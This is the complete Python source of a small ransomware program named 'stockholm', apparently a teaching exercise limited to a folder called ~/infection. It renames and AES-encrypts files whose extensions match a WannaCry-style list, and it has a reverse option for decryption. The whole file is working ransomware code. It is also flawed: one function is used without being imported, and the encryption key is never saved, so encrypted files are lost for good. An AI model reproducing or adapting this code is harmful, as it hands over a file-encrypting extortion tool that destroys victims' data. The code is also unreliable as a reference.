## @file
# @brief This file contains the stockholm program.

import os
import sys
import getopt
import secrets
import getpass
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

## List of file extensions targeted by the ransomware.
WANNACRY_EXTENSIONS = [
    ".doc", ".dot", ".docx", ".docm", ".dotx", ".dotm", ".docb", ".xls", ".xlt", ".xlsx", ".xlsm", ".xltx",
    ".xltm", ".xlsb", ".xla", ".xlam", ".xll", ".xlw", ".ppt", ".pot", ".pps", ".pptx", ".pptm", ".potx", ".potm",
    ".ppam", ".ppsx", ".ppsm", ".sldx", ".sldm", ".wav", ".wb2", ".wk1", ".pdf", ".rtf", ".csv", ".xls", ".xls",
    ".pst", ".ost", ".pab", ".oab", ".msg", ".eml", ".edb", ".nab", ".one", ".vsd", ".vss", ".vst", ".vdx", ".vsx",
    ".vtx", ".vssx", ".vsdx", ".vstx", ".potx", ".ppsx", ".pptx", ".xlsx", ".docx"
]

## Encrypts a file using AES encryption in CBC mode.
# @param file_path The path to the file to be encrypted.
# @param key The encryption key used for AES encryption.
def encrypt_file(file_path, key):
    backend = default_backend()

    # Generate a random initialization vector.
    iv = secrets.token_bytes(16)

    # Create a cipher using AES in CBC mode with the generated initialization vector.
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()

    with open(file_path, 'rb') as file:
        plaintext = file.read()

    # Apply PKCS7 padding to the plaintext.
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_plaintext = padder.update(plaintext) + padder.finalize()

    # Encrypt the padded plaintext.
    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()

    # Write the initialization vector and ciphertext to the file.
    with open(file_path, 'wb') as file:
        file.write(iv + ciphertext)

## Decrypts a file that was encrypted using AES encryption in CBC mode.
# @param file_path The path to the file to be decrypted.
# @param key The decryption key used for AES decryption.
def decrypt_file(file_path, key):
    backend = default_backend()

    with open(file_path, 'rb') as file:
        data = file.read()

    # Extract the initialization vector and ciphertext from the file.
    iv = data[:16]
    ciphertext = data[16:]

    # Create a cipher using AES in CBC mode with the extracted initialization vector.
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    decryptor = cipher.decryptor()

    # Decrypt the ciphertext.
    padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    # Remove padding from the plaintext.
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()

    with open(file_path, 'wb') as file:
        file.write(plaintext)

## Renames and optionally encrypts or decrypts files in a given directory.
# @param directory The directory containing the files to be processed.
# @param key The encryption or decryption key.
# @param reverse If True, perform decryption instead of encryption.
# @param silent If True, run without producing any output.
def rename_files(directory, key, reverse, silent):
    try:
        file_list = os.listdir(directory)
        for file_name in file_list:
            file_path = os.path.join(directory, file_name)

            if os.path.isfile(file_path) and not file_name.endswith('.ft'):
                extension = os.path.splitext(file_name)[1]
                if extension.lower() in WANNACRY_EXTENSIONS:
                    new_file_path = os.path.join(directory, file_name + ".ft")

                    os.rename(file_path, new_file_path)
                    if not silent:
                        print("Renamed file:", new_file_path)

                    if not reverse:
                        encrypt_file(new_file_path, key)
                    else:
                        decrypt_file(new_file_path, key)

    except OSError as e:
        print("Error:", str(e))

## Prints the usage information and available options.
def print_help():
    print("Usage: python3 stockholm.py [options]")
    print("Options:")
    print("  -h, --help            Show help message and exit")
    print("  -v, --version         Show program version")
    print("  -r KEY, --reverse KEY Reverse the infection using the provided key")
    print("  -s, --silent          Run silently without producing any output")

## Prints the program version information.
def print_version():
    print("Ransomware Stockholm v1.0")

## @fn main.
def main(argv):
    reverse = False
    silent = False

    try:
        opts, _ = getopt.getopt(argv, "hvr:s", ["help", "version", "reverse=", "silent"])
    except getopt.GetoptError:
        print("Invalid option")
        print_help()
        sys.exit(2)

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print_help()
            sys.exit()
        elif opt in ("-v", "--version"):
            print_version()
            sys.exit()
        elif opt in ("-r", "--reverse"):
            key = getpass.getpass("Enter the decryption key: ").encode()
            reverse = True
        elif opt in ("-s", "--silent"):
            silent = True

    home_dir = os.path.expanduser("~")
    infection_dir = os.path.join(home_dir, "infection")

    if not os.path.exists(infection_dir):
        print("Error: The 'infection' directory does not exist in the HOME directory.")
        sys.exit(1)

    key = secrets.token_bytes(32) if not reverse else key

    rename_files(infection_dir, key, reverse, silent)

    sys.exit(0)

## @fn __name__.
if __name__ == "__main__":
    main(sys.argv[1:])
